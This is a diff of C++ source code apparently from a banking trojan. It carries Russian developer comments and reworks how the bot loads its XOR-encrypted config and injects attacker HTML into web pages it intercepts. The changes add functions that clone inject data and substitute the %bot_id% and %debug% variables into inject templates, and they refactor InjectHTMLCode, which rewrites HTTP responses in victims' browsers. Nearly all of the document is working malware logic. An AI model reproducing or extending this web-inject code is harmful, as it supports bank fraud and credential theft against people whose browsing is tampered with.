@@ -59,7 +59,8 @@ void CallHTMLInjectEvent(LPVOID Sender, THTMLInjectEventID ID, LPVOID Reserved)
 }
 #endif
 
-void GetCurrentConfigHostSetings(bool * http, bool * https) {
+void GetCurrentConfigHostSetings(bool * http, bool * https)
+{
 	*http = bHttp;
 	*https = bHttps;
 }
@@ -71,56 +72,57 @@ PCHAR SniHostFromCfg = NULL; // 4
 PCHAR PluginsHostFromCfg = NULL; // 5
 DWORD TimeOut = 70;
 
-/*
-char* GetCurrentHostFromConfig(int Num)
-{
-char * Res;
-if (Num==1)Res=FgrHostFromCfg;
-if (Num==2)Res=GraHostFromCfg;
-if (Num==3)Res=ScrHostFromCfg;
-if (Num==4)Res=SniHostFromCfg;
-if (Res==NULL)return NULL;
-char* Domain;
-char *cUrl;
-int i;
 
-
-
-while(true)
-{
-cUrl= m_strstr(Res,"|");
-if (cUrl==NULL)
-{
-Domain=NULL;
-break;
-}
-i=m_lstrlen(Res)-m_lstrlen(cUrl);
-Domain=(char*)MemAlloc(i+1);
-m_memcpy(Domain,Res,i);
-if (!CheckHost(Domain))
-{
-Res+=i+1;
-MemFree(Domain);
-}
-else
-break;
-}
-
-
-return Domain;
-}
-
-
-
-DWORD GetConfigTimeOut()
-{
-return TimeOut;
-}
-
- */
 // ----------------------------------------------------------------------------
 
-PCHAR ReadStrBlock_(PCHAR &Buf) {
+
+void HTMLInjectSetVariableValue(PHTMLInjectData Data, const char* Variable, const char* Value)
+{
+	// Функция заменяет знасение переменной
+	PCHAR Temp = NULL;
+
+	#define __Replace(Str) if (Temp != NULL) {STR::Free2(Str); Str = Temp;}
+
+	// Меняем переменные во всех блоках
+	Temp = STR::Replace(Data->Before, (PCHAR)Variable, (PCHAR)Value);
+	__Replace(Data->Before);
+
+	Temp = STR::Replace(Data->Inject, (PCHAR)Variable, (PCHAR)Value);
+	__Replace(Data->Inject);
+
+	Temp  = STR::Replace(Data->After, (PCHAR)Variable, (PCHAR)Value);
+	__Replace(Data->After);
+}
+
+
+void HTMLInjectSetSystemVariables(PHTMLInjectData Data)
+{
+	// Функция меняет идендификатор бота на его значение
+
+	if (Data == NULL) return;
+
+    const static char VariableBotID[] = {'%', 'b', 'o', 't', '_', 'i', 'd', '%', 0};
+    const static char VariableDebug[] = {'%','d','e','b','u','g','%', 0};
+
+	PCHAR BotID = GenerateBotID();
+	#ifdef DEBUGCONFIG
+	PCHAR IsDebug = "true";
+	#else
+	PCHAR IsDebug = "false";
+	#endif
+
+
+	HTMLInjectSetVariableValue(Data, VariableBotID, BotID);
+    HTMLInjectSetVariableValue(Data, VariableDebug, IsDebug);
+
+	STR::Free(BotID);
+}
+
+// ----------------------------------------------------------------------------
+
+
+PCHAR ReadStrBlock_(PCHAR &Buf)
+{
 	// Функция читаем строку из буфера и смещает указатель за строку
 	// формат буфера (DWORD - Длина строки)(Строка)
 	DWORD Size = *(DWORD*)Buf;
@@ -131,13 +133,13 @@ PCHAR ReadStrBlock_(PCHAR &Buf) {
 	Buf += Size;
 	return Str;
 }
- 
+
 bool DoLoadConfigFromFileEx(PBotConfig Config, PWCHAR FileName)
 {
 
 	// Загрухить конфигурационный файл
 
-	Config::Clear(Config);  
+	Config::Clear(Config);
 
 	CFGDBG("BotConfig", "Загружаем файл");
 
@@ -165,7 +167,7 @@ bool DoLoadConfigFromFileEx(PBotConfig Config, PWCHAR FileName)
 	DWORD Readed = 0;
 	if (!pReadFile(File, FileBuf, FileSize, &Readed, NULL))
 	{
-    	MemFree(FileBuf);
+		MemFree(FileBuf);
 		pCloseHandle(File);
 		return false;
 	}
@@ -187,15 +189,11 @@ bool DoLoadConfigFromFileEx(PBotConfig Config, PWCHAR FileName)
         }
 	}
 
-
-
 	// Читаем данные
-	const static char Signature[] = {
-		'B', 'J', 'B', 0
-	};
 	PCHAR Buf = (PCHAR)XORCrypt::DecodeBuffer
-		((PCHAR)Signature, FileBuf, Readed);
-	if (Buf == NULL) {
+		((PCHAR)ConfigSignature, FileBuf, Readed);
+	if (Buf == NULL)
+	{
 		pCloseHandle(File);
 		return false;
 	}
@@ -219,7 +217,7 @@ bool DoLoadConfigFromFileEx(PBotConfig Config, PWCHAR FileName)
 	TimeOut = *(DWORD*)Buf;
 	Buf += sizeof(DWORD);
 
-	// ------------- Настройки продоколов -------------//
+	// ------------- Настройки протоколов -------------//
 	bHttp = *Buf != 0;
 	Buf++;
 
@@ -269,6 +267,12 @@ bool DoLoadConfigFromFileEx(PBotConfig Config, PWCHAR FileName)
 
 			if (!STR::IsEmpty(Data->Before))
 				Data->MacrosHash = CalcHash(Data->Before);
+
+			// В рабочем боте подменяем переменные в момент загрузки конфига
+			#ifndef BV_APP
+				HTMLInjectSetSystemVariables(Data);
+			#endif
+
 		}
 	}
 	MemFree(FileBuf);
@@ -351,7 +355,8 @@ void CheckConfigUpdates(PBotConfig Config)
 
 // ----------------------------------------------------------------------------
 
-void FreeHTMLInjectData(LPVOID Data) {
+void FreeHTMLInjectData(LPVOID Data)
+{
 	// Уничтожить данные HTML инжекта
 	PHTMLInjectData D = (PHTMLInjectData)Data;
 	STR::Free(D->Before);
@@ -681,7 +686,7 @@ void Config::SetFileName(PWCHAR FileName) {
 
 bool Config::IsConfig(PCHAR Buf) {
 	// Функция возвращает истину если буфер является конфигом
-	return StrSame(Buf, "BJB", true, 3);
+	return StrSame(Buf, (PCHAR)ConfigSignature, true, StrCalcLength(ConfigSignature));
 }
 // ----------------------------------------------------------------------------
 
@@ -990,25 +995,20 @@ bool SendHTMLLogToServer(PCHAR Buffer, PHTMLInject Inject,
 }
 
 // ----------------------------------------------------------------------------
-bool HTMLInjectReplaceBotID(PCHAR SourceHTML, PCHAR BotID, PCHAR &OutPutHTML) {
-	// Функция меняет идендификатор бота на его значение
 
-	OutPutHTML = SourceHTML;
-	if (STR::IsEmpty(SourceHTML) || STR::IsEmpty(BotID))
-		return false;
-
-	const static char BotIDName[] = {
-		'%', 'b', 'o', 't', '_', 'i', 'd', '%', 0
-	};
-
-	OutPutHTML = STR::Replace(SourceHTML, (PCHAR)BotIDName, BotID);
-	if (OutPutHTML != NULL)
-		return true;
-	else
-		OutPutHTML = SourceHTML;
-	return false;
+PHTMLInjectData HTMLInjectCloneData(PHTMLInjectData Data)
+{
+	// Функция клонирует данные HTML инжекта
+	PHTMLInjectData R = CreateStruct(THTMLInjectData);
+	if (R != NULL)
+	{
+		CopyStruct(Data, R);
+		R->Before = STR::New(Data->Before);
+		R->Inject = STR::New(Data->Inject);
+		R->After  = STR::New(Data->After);
+	}
+	return R;
 }
-
 // ----------------------------------------------------------------------------
 
 bool InjectHTMLCode(PRequest Request, PHTMLInject Inject) {
@@ -1020,40 +1020,45 @@ bool InjectHTMLCode(PRequest Request, PHTMLInject Inject) {
 	DWORD NewLen = 0;
 
 	DWORD Count = List::Count(Inject->Injects);
-	PHTMLInjectData Data;
 	bool Injected; // Признак того, что был произведён хотя-бы один инжект
 
 	PCHAR BotID = GenerateBotID();
 
-	for (DWORD i = 0; i < Count; i++) {
-		Data = (PHTMLInjectData)List::GetItem(Inject->Injects, i);
+	for (DWORD i = 0; i < Count; i++)
+	{
+		PHTMLInjectData SourceData = (PHTMLInjectData)List::GetItem(Inject->Injects, i);
 
-		// Обработанные данные игнорируем
-		if (Data->Disabled /* || Data->State == idsOk */ )
-			continue;
+        PHTMLInjectData Data = SourceData;
 
-		/* TODO :
-		В данный момент производим вставку идендификатора бота при каждом инжекте.
-		Это не оптимальное решение, опимально было0бы производить подмену один раз, при загрузке
-		инжектов. Но в данный момент оставим этот вариант по причине того, что визуальные редакторы инжектов
-		используют этот-же массив инжектов, что и сам бот.
-		В дальнейшем необходимо просмотреть оптимальный вариант вставки идентификаторов бота */
+		// Отключенные данные игнорируем
+		if (Data->Disabled) continue;
 
-		PCHAR InjectData = NULL;
-		bool FreeInnjectData = HTMLInjectReplaceBotID(Data->Inject, BotID, InjectData);
+		#ifdef BV_APP
+			// В в изуальном редакторе клонируем данные на случай
+			// если в исходных кодах инжектов будут системмные переенные
+			Data = HTMLInjectCloneData(SourceData);
+			if (Data == NULL) continue;
 
-		if (Data->MacrosHash == 0)
-			Data->MacrosHash = CalcHash(Data->Before);
+			// Заменяем системмные переменные
+			HTMLInjectSetSystemVariables(Data);
+		#endif
+
 
 		Injected  = false;
 		NewBuffer = NULL;
-        NewLen    = 0;
+		NewLen    = 0;
+
+		if (Data->MacrosHash == 0)
+		{
+			Data->MacrosHash = CalcHash(Data->Before);
+			SourceData->MacrosHash = Data->MacrosHash;
+        }
 
 		if (Data->MacrosHash == HIM_REPLACE_DOCUMENT)
 		{
 			// Заменяем всё содержимое документа
 			Injected = true;
-			NewBuffer = InjectData;
+			NewBuffer = Data->Inject;
             NewLen = StrCalcLength(NewBuffer);
 		}
 		else
@@ -1064,7 +1069,7 @@ bool InjectHTMLCode(PRequest Request, PHTMLInject Inject) {
 
 			PCHAR Before = Data->Before;
 			PCHAR After  = Data->After;
-			PCHAR Inject = InjectData;
+			PCHAR Inject = Data->Inject;
 
 			bool IsLinuxStr = STR::IsLinuxStr((PCHAR)Request->Buffer);
 			if (IsLinuxStr)
@@ -1096,20 +1101,22 @@ bool InjectHTMLCode(PRequest Request, PHTMLInject Inject) {
         	// Инжект сработал, обрабатываем данные
 			Request::SetBuffer(Request, (LPBYTE)NewBuffer, NewLen);
 
-			Data->State = idsOk;
+			SourceData->State = idsOk;
 
 			#ifdef BOTMONITOR
-				BotMonitor::SendMessage((PCHAR)BotMonitor::ConfigDataExec, (PCHAR)&Data->ID, sizeof(Data->ID));
+				BotMonitor::SendMessage((PCHAR)BotMonitor::ConfigDataExec, (PCHAR)&SourceData->ID, sizeof(SourceData->ID));
 			#endif
 
-			#ifdef BV_APP
-				CallHTMLInjectEvent(Data, injDataHandled, NULL);
+			#ifdef BV_APP                                               s
+				CallHTMLInjectEvent(SourceData, injDataHandled, NULL);
 			#endif
-        }
+		}
 
-		if (FreeInnjectData)
-			STR::Free(InjectData);
 
+		#ifdef BV_APP
+        	// уничтожаем клонированные данные
+        	FreeHTMLInjectData(Data);
+		#endif
 	}
 
 	STR::Free(BotID);
